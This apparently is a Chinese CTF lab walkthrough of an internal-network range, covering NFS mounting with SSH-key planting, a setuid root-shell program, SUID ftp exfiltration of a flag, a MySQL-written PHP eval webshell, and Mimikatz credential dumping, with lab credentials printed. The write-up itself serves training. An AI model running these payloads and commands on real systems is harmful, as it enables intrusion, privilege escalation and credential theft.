</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.13.57:111  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.13.57:20048  ...  OK</span><br><span class="line">Export list for 172.22.13.57:</span><br><span class="line">/home/joyce *</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在kali挂载不成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/13.png"></p><p>看了wp直接在入口机装nfs服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common -y</span><br></pre></td></tr></table></figure><p>直接安装失败</p><p>使用下面这些命令安装</p><p><a href="https://gist.github.com/zkryakgul/bb561235b7f36c57d15a015d20c7e336">https://gist.github.com/zkryakgul/bb561235b7f36c57d15a015d20c7e336</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/n/nfs-utils/nfs-common_1.3.4-2.5ubuntu3_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/libn/libnfsidmap/libnfsidmap2_0.25-5.1ubuntu1_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc3_1.2.5-1_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/r/rpcbind/rpcbind_1.2.5-8_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/k/keyutils/keyutils_1.6-6ubuntu1_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc-common_1.2.5-1_all.deb</span><br><span class="line">sudo dpkg -i libnfsidmap2_0.25-5.1ubuntu1_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i libtirpc-common_1.2.5-1_all.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i libtirpc3_1.2.5-1_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i rpcbind_1.2.5-8_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i keyutils_1.6-6ubuntu1_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i nfs-common_1.3.4-2.5ubuntu3_amd64.deb</span><br></pre></td></tr></table></figure><p>挂载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# mkdir temp</span><br><span class="line">root@ubuntu:/tmp# ls</span><br><span class="line">bash                             libnfsidmap2_0.25-5.1ubuntu1_amd64.deb  result.txt                       tomcat-docbase.8080.4051554996308753889</span><br><span class="line">fscan                            libtirpc3_1.2.5-1_amd64.deb             rpcbind_1.2.5-8_amd64.deb</span><br><span class="line">hsperfdata_root                  libtirpc-common_1.2.5-1_all.deb         temp</span><br><span class="line">keyutils_1.6-6ubuntu1_amd64.deb  nfs-common_1.3.4-2.5ubuntu3_amd64.deb   tomcat.8080.4881516889748131666</span><br><span class="line">root@ubuntu:/tmp# mount -t nfs 172.22.13.57:/ ./temp -o nolock</span><br><span class="line">root@ubuntu:/tmp# cd temp/</span><br><span class="line">root@ubuntu:/tmp/temp# ls</span><br><span class="line">home</span><br></pre></td></tr></table></figure><p>写ssh公钥远程连接getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali攻击机</span><br><span class="line">ssh-keygen</span><br><span class="line">cat id_rsa.pub</span><br><span class="line"></span><br><span class="line">NFS控制机</span><br><span class="line">mkdir .ssh</span><br><span class="line">echo &quot;xxx&quot;&gt;&gt;/tmp/temp/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/temp]</span><br><span class="line">└─# ssh-keygen -t rsa -b 4096</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:/pZD+S6QQLqIrEkQildnO7v7DT7hvoNFUX4UwEHLWZE root@kali</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 4096]----+</span><br><span class="line">|         +=o=+   |</span><br><span class="line">|.   . + .o.=E    |</span><br><span class="line">|o. . = . .= .    |</span><br><span class="line">|+ . . + .  .     |</span><br><span class="line">|oo . . =S. .     |</span><br><span class="line">|.o. . ..= o      |</span><br><span class="line">|o.     =o+ o     |</span><br><span class="line">|o     o.++= .    |</span><br><span class="line">|      .+==o+.    |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/home/kali/red/temp]</span><br><span class="line">└─# cd /root/.ssh/      </span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~/.ssh]</span><br><span class="line">└─# ls   </span><br><span class="line">id_ed25519  id_ed25519.pub  id_rsa  id_rsa.pub  known_hosts  known_hosts.old</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/.ssh]</span><br><span class="line">└─# cat id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCY2z7bt2deYTFqmsgK/gDzgv8RZ/dN9HHntrs71HdHfMKSpE2lxXU9vqo5Yzp5LSuksaeAmt9PSm++SWvo7QVhdbu0CsSbkDBZL+y9bKf/Gy1lcfEvcoPourZmj+p2EpSG3BSNgNTK+QwZLCYFiuBpWvmrYbuFEsBYh32Zyf/+S7szlc/60HC9vhWs0ZD5ANtOqeZQcY/+56zQRYgwqlbLeclvi1yjtRDrVmGVvQ9JdGso5YnL0WKYP6RgZxLpubJjvbEZS+z5VnymmMquFdco5DDaXABBiiUlSH0yzAEOdLUrB9eZ5JNqTj4x5btg9i+M6FYD/heoE23yB+mgPdThyYCIqzlyfeGJjIXKltJb3kWl+/p5Z4HfO2AT8+b1Kr2pK4d5AAIAiFv1/wEUVWqpsy+ebwMEV4C0VXDDr0UZbP+U0c1rL9OGlGpba5WBzykx8uJqeYQu+TdUpJgxonFn75bh4gv7TmWkF6gFIf1oFg4zeiIh6NKyIKabkADxs1X97wYcWgg480ZHZ50ZOLOPRL+NbrMsmJ4ZWYDaJ5tfR3dnRwmysAIT2q/Jo52BIWl/8nvw8/HDLPubswdQ3puSFXMiJJv/gcZepXG7J7XFJCtRLWikfNHOKfnyTwSmFo7OIXzRTLGqD4OCIl2tJwOEfl0HPePTn7/Ys8F+YFkx3w== root@kali</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCY2z7bt2deYTFqmsgK/gDzgv8RZ/dN9HHntrs71HdHfMKSpE2lxXU9vqo5Yzp5LSuksaeAmt9PSm++SWvo7QVhdbu0CsSbkDBZL+y9bKf/Gy1lcfEvcoPourZmj+p2EpSG3BSNgNTK+QwZLCYFiuBpWvmrYbuFEsBYh32Zyf/+S7szlc/60HC9vhWs0ZD5ANtOqeZQcY/+56zQRYgwqlbLeclvi1yjtRDrVmGVvQ9JdGso5YnL0WKYP6RgZxLpubJjvbEZS+z5VnymmMquFdco5DDaXABBiiUlSH0yzAEOdLUrB9eZ5JNqTj4x5btg9i+M6FYD/heoE23yB+mgPdThyYCIqzlyfeGJjIXKltJb3kWl+/p5Z4HfO2AT8+b1Kr2pK4d5AAIAiFv1/wEUVWqpsy+ebwMEV4C0VXDDr0UZbP+U0c1rL9OGlGpba5WBzykx8uJqeYQu+TdUpJgxonFn75bh4gv7TmWkF6gFIf1oFg4zeiIh6NKyIKabkADxs1X97wYcWgg480ZHZ50ZOLOPRL+NbrMsmJ4ZWYDaJ5tfR3dnRwmysAIT2q/Jo52BIWl/8nvw8/HDLPubswdQ3puSFXMiJJv/gcZepXG7J7XFJCtRLWikfNHOKfnyTwSmFo7OIXzRTLGqD4OCIl2tJwOEfl0HPePTn7/Ys8F+YFkx3w== root@kali&quot;&gt;&gt; ./.ssh/authorized_keys</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp/temp# mkdir .ssh</span><br><span class="line">mkdir: cannot create directory ‘.ssh’: Read-only file system</span><br><span class="line">root@ubuntu:/tmp/temp# cd home/</span><br><span class="line">root@ubuntu:/tmp/temp/home# ls</span><br><span class="line">joyce</span><br><span class="line">root@ubuntu:/tmp/temp/home# cd joyce/</span><br><span class="line">root@ubuntu:/tmp/temp/home/joyce# mkdir .ssh</span><br><span class="line">root@ubuntu:/tmp/temp/home/joyce# echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCY2z7bt2deYTFqmsgK/gDzgv8RZ/dN9HHntrs71HdHfMKSpE2lxXU9vqo5Yzp5LSuksaeAmt9PSm++SWvo7QVhdbu0CsSbkDBZL+y9bKf/Gy1lcfEvcoPourZmj+p2EpSG3BSNgNTK+QwZLCYFiuBpWvmrYbuFEsBYh32Zyf/+S7szlc/60HC9vhWs0ZD5ANtOqeZQcY/+56zQRYgwqlbLeclvi1yjtRDrVmGVvQ9JdGso5YnL0WKYP6RgZxLpubJjvbEZS+z5VnymmMquFdco5DDaXABBiiUlSH0yzAEOdLUrB9eZ5JNqTj4x5btg9i+M6FYD/heoE23yB+mgPdThyYCIqzlyfeGJjIXKltJb3kWl+/p5Z4HfO2AT8+b1Kr2pK4d5AAIAiFv1/wEUVWqpsy+ebwMEV4C0VXDDr0UZbP+U0c1rL9OGlGpba5WBzykx8uJqeYQu+TdUpJgxonFn75bh4gv7TmWkF6gFIf1oFg4zeiIh6NKyIKabkADxs1X97wYcWgg480ZHZ50ZOLOPRL+NbrMsmJ4ZWYDaJ5tfR3dnRwmysAIT2q/Jo52BIWl/8nvw8/HDLPubswdQ3puSFXMiJJv/gcZepXG7J7XFJCtRLWikfNHOKfnyTwSmFo7OIXzRTLGqD4OCIl2tJwOEfl0HPePTn7/Ys8F+YFkx3w== root@kali&quot;&gt;&gt; ./.ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kali连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ssh  -i /root/.ssh/id_rsa joyce@172.22.13.57</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/14.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[joyce@centos home]$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/ftp</span><br><span class="line">/usr/bin/umount</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ftp提权"><a href="#ftp提权" class="headerlink" title="ftp提权"></a>ftp提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 6666 -u test -P test -w &amp;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/15.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/16.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[joyce@centos /]$ ftp 172.22.13.14 6666</span><br><span class="line">Connected to 172.22.13.14 (172.22.13.14).</span><br><span class="line">220 pyftpdlib 1.5.6 ready.</span><br><span class="line">Name (172.22.13.14:joyce): test</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; put /flag02.txt</span><br><span class="line">local: /flag02.txt remote: /flag02.txt</span><br><span class="line">227 Entering passive mode (172,22,13,14,194,59).</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">466 bytes sent in 1.1e-05 secs (42363.64 Kbytes/sec)</span><br><span class="line">ftp&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/17.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/18.png"></p><h3 id="nfs提权"><a href="#nfs提权" class="headerlink" title="nfs提权"></a>nfs提权</h3><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/19.png"></p><p>入口机完成操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27; &gt; shell.c</span><br><span class="line">gcc shell.c -o shell</span><br><span class="line">chmod +s shell</span><br></pre></td></tr></table></figure><p>然后在57上运行</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/20.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@centos /]# ls</span><br><span class="line">bin  boot  dev  etc  flag02.txt  home  lib  lib64  lost+found  media  mnt  opt  pAss.txt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">[root@centos /]# cat flag02.txt </span><br><span class="line"> SSS  h           d                CCC            d           t         l     </span><br><span class="line">S     h           d               C               d           t  ii     l     </span><br><span class="line"> SSS  hhh   aa  ddd ooo w   w     C    rrr eee  ddd eee nnn  ttt     aa l  ss </span><br><span class="line">    S h  h a a d  d o o w w w     C    r   e e d  d e e n  n  t  ii a a l  s  </span><br><span class="line">SSSS  h  h aaa  ddd ooo  w w       CCC r   ee   ddd ee  n  n  tt ii aaa l ss  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag02: flag&#123;f5fb0619-45bb-4ab3-9000-0b7f88778787&#125;</span><br><span class="line"></span><br><span class="line">hint: relay race</span><br><span class="line">[root@centos /]# cat pAss.txt </span><br><span class="line">xiaorang.lab/zhangwen\QT62f3gBhK1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>又获得了个账密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.14  39.99.248.209  ftp 匿名登录  xstream cc 公司发货单 已拿下 入口机</span><br><span class="line">172.22.13.57 CentOS  nfs  已拿下</span><br><span class="line">172.22.13.28 OA系统、mysql弱口令root/123456</span><br><span class="line">172.22.13.6  WIN-DC DC域 </span><br></pre></td></tr></table></figure><p>前面还有mysql弱口令</p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><h3 id="mysql写webshell"><a href="#mysql写webshell" class="headerlink" title="mysql写webshell"></a>mysql写webshell</h3><p>那就打oa</p><p>记得挂代理</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/21.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/22.png"></p><p>丝滑小连招bychun0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;On&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;网站绝对路径/马子&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-- 1. 确认文件写入权限</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line">-- 2. 查找日志配置（定位写入路径）</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">show variables like &#x27;%secure%&#x27;; </span><br><span class="line"></span><br><span class="line">-- 3. 启用全局日志（记录所有SQL操作）</span><br><span class="line">set global general_log=&#x27;On&#x27;;</span><br><span class="line"></span><br><span class="line">-- 4. 修改日志路径到Web目录（写入Webshell）</span><br><span class="line">set global general_log_file=&#x27;网站绝对路径/马子.php&#x27;;</span><br><span class="line"></span><br><span class="line">-- 5、 确认是否修改成功</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">-- 6. 触发日志写入（生成Webshell）</span><br><span class="line">select &#x27;&lt;?php eval($_POST[0]);?&gt;&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font style="color:rgb(102, 102, 102);">查看下是否有写入权限，具体命令如下</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/23.png"></p><p><font style="color:rgb(102, 102, 102);">接下来查看</font><code>&lt;font style=&quot;color:rgb(102, 102, 102);background-color:rgba(27, 31, 35, 0.05);&quot;&gt;plugin&lt;/font&gt;</code><font style="color:rgb(102, 102, 102);">目录获取路径</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/24.png"></p><p><font style="color:rgb(102, 102, 102);">获取到路径，接下来写入一句话木马</font></p><p><font style="color:rgb(102, 102, 102);"></font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[1]);?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\www\\shell.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/25.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/26.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/27.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/28.png"></p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><h3 id="writeDACL"><a href="#writeDACL" class="headerlink" title="writeDACL"></a>writeDACL</h3><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/29.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/30.png"></p><p>新建用户</p><p>rdp上去好操作</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/31.png"></p><p><font style="color:rgb(102, 102, 102);">上传Mimikatz进行密码搜集</font></p><p><font style="color:rgb(102, 102, 102);"></font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">log 1.txt</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span 